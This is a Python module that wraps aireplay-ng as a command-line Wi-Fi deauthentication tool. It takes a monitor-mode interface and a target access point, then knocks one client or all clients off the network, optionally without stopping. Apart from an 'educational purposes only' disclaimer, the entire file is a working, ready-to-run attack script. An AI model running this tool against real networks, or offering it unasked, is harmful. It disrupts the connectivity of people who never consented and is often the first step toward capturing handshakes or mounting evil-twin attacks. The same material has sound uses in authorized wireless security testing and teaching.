# modules/deauth_attack.py

import subprocess
import os
import sys
import shutil # For shutil.which
import argparse
import re
import time

# --- Configuration ---
AIREPLAY_COMMAND = "aireplay-ng"
# ---------------------

def is_tool_installed(name):
    """Check whether `name` is on PATH and marked as executable."""
    if shutil.which(name) is None:
        print(f"[!] Error: '{name}' command not found. Please install it first.")
        return False
    return True

def is_valid_mac(mac_address):
    """Basic validation for MAC address format."""
    if mac_address is None: # Allowed for broadcast deauth
        return True
    # Regex for MAC address (XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX)
    if re.fullmatch(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", mac_address):
        return True
    print(f"[!] Invalid MAC address format: {mac_address}")
    return False

def deauth_attack(interface, ap_mac, target_mac=None, num_packets=10, use_sudo=True):
    """
    Performs a deauthentication attack using aireplay-ng.

    :param interface: Wireless interface in monitor mode (e.g., wlan0mon).
    :param ap_mac: MAC address of the target Access Point (BSSID).
    :param target_mac: (Optional) MAC address of the specific client to deauthenticate.
                       If None or "FF:FF:FF:FF:FF:FF", deauthenticates all clients from the AP.
    :param num_packets: Number of deauthentication packets to send. 0 for continuous.
    :param use_sudo: Boolean, whether to prepend 'sudo' to the command.
    :return: True if the command was executed successfully (doesn't guarantee deauth worked), False otherwise.
    """
    print(f"[*] Preparing deauthentication attack...")
    print(f"    Interface: {interface}")
    print(f"    AP MAC (BSSID): {ap_mac}")
    if target_mac and target_mac.upper() != "FF:FF:FF:FF:FF:FF":
        print(f"    Target Client MAC: {target_mac}")
    else:
        print(f"    Target Client MAC: All clients (Broadcast)")
        target_mac = None # Ensure it's None for command construction if broadcast
    print(f"    Number of packets: {'Continuous' if num_packets == 0 else num_packets}")
    print(f"[!] IMPORTANT: Ensure interface '{interface}' is in MONITOR MODE before running this attack.")

    if not is_tool_installed(AIREPLAY_COMMAND):
        return False

    if not is_valid_mac(ap_mac):
        print(f"[!] Invalid AP MAC address: {ap_mac}")
        return False
    if target_mac and not is_valid_mac(target_mac): # target_mac can be None
        print(f"[!] Invalid Target Client MAC address: {target_mac}")
        return False

    command = []
    if use_sudo:
        if not is_tool_installed("sudo"): # Check if sudo is available
            print("[!] 'sudo' command not found, but use_sudo is True. Cannot proceed.")
            return False
        command.append("sudo")

    command.extend([
        AIREPLAY_COMMAND,
        "--deauth", str(num_packets),
        "-a", ap_mac
    ])

    if target_mac:
        command.extend(["-c", target_mac])

    command.append(interface)

    print(f"[+] Executing: {' '.join(command)}")
    if num_packets == 0:
        print("[+] Sending deauthentication packets continuously. Press Ctrl+C to stop.")

    try:
        # For a command like deauth, we usually let it run and don't capture its output heavily,
        # unless debugging. `check=True` will raise an error if aireplay-ng exits non-zero.
        process = subprocess.Popen(command) # Use Popen for Ctrl+C handling with continuous deauth
        process.wait() # Wait for command to complete or be interrupted

        if process.returncode == 0:
            print(f"[+] Deauthentication command executed successfully on {interface}.")
            return True
        else:
            # aireplay-ng can return non-zero for various reasons, e.g. interface not in monitor mode
            print(f"[-] Aireplay-ng exited with code {process.returncode}. This might indicate an issue (e.g., interface not in monitor mode, wrong BSSID).")
            # You might want to capture and print stderr here if needed for debugging.
            return False

    except FileNotFoundError:
        # This would typically be caught by is_tool_installed, but as a fallback
        print(f"[!] Error: Command not found ('sudo' or '{AIREPLAY_COMMAND}'). Ensure they are installed and in your PATH.")
        return False
    except subprocess.CalledProcessError as e: # If using subprocess.run with check=True
        print(f"[-] Error occurred during deauthentication: {e}")
        if e.stderr:
            print(f"[-] Stderr: {e.stderr.decode().strip()}")
        return False
    except KeyboardInterrupt:
        print(f"\n[!] Deauthentication attack on {interface} interrupted by user.")
        if 'process' in locals() and process.poll() is None: # Check if process is still running
            print("[!] Terminating aireplay-ng process...")
            process.terminate()
            time.sleep(0.5) # Give it a moment
            if process.poll() is None:
                process.kill() # Force kill if terminate didn't work
            process.wait()
            print("[!] Aireplay-ng process terminated.")
        return False # Indicate interruption
    except Exception as e:
        print(f"[-] An unexpected error occurred: {str(e)}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="Perform a Wi-Fi deauthentication attack using aireplay-ng.",
        epilog=f"Example: sudo python3 %(prog)s wlan0mon 00:11:22:AA:BB:CC -c 33:44:55:DD:EE:FF -n 50"
    )
    parser.add_argument("interface", help="Wireless interface in MONITOR MODE (e.g., wlan0mon).")
    parser.add_argument("ap_mac", help="MAC address (BSSID) of the target Access Point.")
    parser.add_argument(
        "-c", "--client_mac",
        help="MAC address of the specific client to deauthenticate. "
             "If omitted or 'FF:FF:FF:FF:FF:FF', deauthenticates all clients from the AP.",
        default=None,
        required=False
    )
    parser.add_argument(
        "-n", "--num_packets",
        type=int,
        default=10,
        help="Number of deauthentication packets to send (0 for continuous). Default: 10."
    )
    parser.add_argument(
        "--no-sudo",
        action="store_false",
        dest="use_sudo",
        help="Do not use 'sudo' to run aireplay-ng (not recommended unless aireplay-ng has necessary capabilities set)."
    )

    args = parser.parse_args()

    print("=======================================================")
    print("              Wi-Fi Deauthentication Tool              ")
    print("=======================================================")
    print("Disclaimer: This script is for educational purposes ONLY.")
    print("Using this tool against networks for which you do not have")
    print("explicit, written permission is illegal. The user is responsible")
    print("for their actions. Ensure your wireless interface is in")
    print("MONITOR MODE before use (e.g., using 'sudo airmon-ng start wlan0').")
    print("=======================================================\n")

    # Validate that an interface was actually passed (argparse 'required' handles this for positional)
    if not args.interface:
        print("[!] Interface name cannot be empty.")
        parser.print_help()
        sys.exit(1)

    if args.client_mac and args.client_mac.upper() == "FF:FF:FF:FF:FF:FF":
        effective_client_mac = None # Treat as broadcast
    else:
        effective_client_mac = args.client_mac

    success = deauth_attack(
        args.interface,
        args.ap_mac,
        target_mac=effective_client_mac,
        num_packets=args.num_packets,
        use_sudo=args.use_sudo
    )

    if success:
        print("\n[+] Deauthentication attack process completed.")
    else:
        print("\n[-] Deauthentication attack process failed or was interrupted.")

if __name__ == "__main__":
    # Check for root privileges if sudo is intended, as aireplay-ng needs them
    # However, the script itself uses sudo, so the script doesn't need to be run as root
    # directly, but the user running it must have sudo privileges for aireplay-ng.
    main()